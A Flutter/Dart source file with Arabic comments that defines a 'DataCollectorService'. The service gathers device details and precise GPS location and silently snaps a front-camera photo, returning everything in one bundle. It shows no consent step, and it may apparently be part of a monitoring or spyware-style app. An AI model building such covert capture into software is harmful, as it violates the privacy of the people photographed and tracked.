// lib/core/control/data_collector_service.dart
import 'dart:async';

import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart';

import '../camera/camera_service.dart';
import '../location/location_service.dart';
import '../permissions/device_info_service.dart';

class DataCollectorService {
  final CameraService _cameraService = CameraService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final LocationService _locationService = LocationService();

  /// جمع البيانات الأولية من واجهة المستخدم
  Future<Map<String, dynamic>> collectInitialDataFromUiThread() async {
    try {
      debugPrint("DataCollectorService: Starting initial data collection");

      // جمع معلومات الجهاز
      final deviceInfo = await _deviceInfoService.getDeviceInfo();

      // جمع معلومات الموقع
      final location = await _locationService.getCurrentLocation();
      final locationData = location != null
          ? {
              'latitude': location.latitude,
              'longitude': location.longitude,
              'accuracy': location.accuracy,
              'altitude': location.altitude,
              'speed': location.speed,
              'timestamp': location.timestamp.toIso8601String(),
            }
          : {'error': 'Location not available'};

      // التقاط صورة من الكاميرا الأمامية
      XFile? imageFile;
      try {
        imageFile = await _cameraService.takePicture(
          lensDirection: CameraLensDirection.front,
        );
      } catch (e) {
        debugPrint("DataCollectorService: Error taking picture: $e");
      }

      // تجميع البيانات
      final Map<String, dynamic> collectedData = {
        'data': {
          'device_info': deviceInfo,
          'location': locationData,
          'timestamp': DateTime.now().toIso8601String(),
        },
        'imageFile': imageFile,
      };

      debugPrint("DataCollectorService: Data collection completed");
      return collectedData;
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting data: $e");
      return {
        'data': {
          'error': 'Error collecting data: $e',
          'timestamp': DateTime.now().toIso8601String(),
        },
        'imageFile': null,
      };
    }
  }

  /// إغلاق الكاميرا وتحرير الموارد
  Future<void> disposeCamera() async {
    await _cameraService.dispose();
  }
}
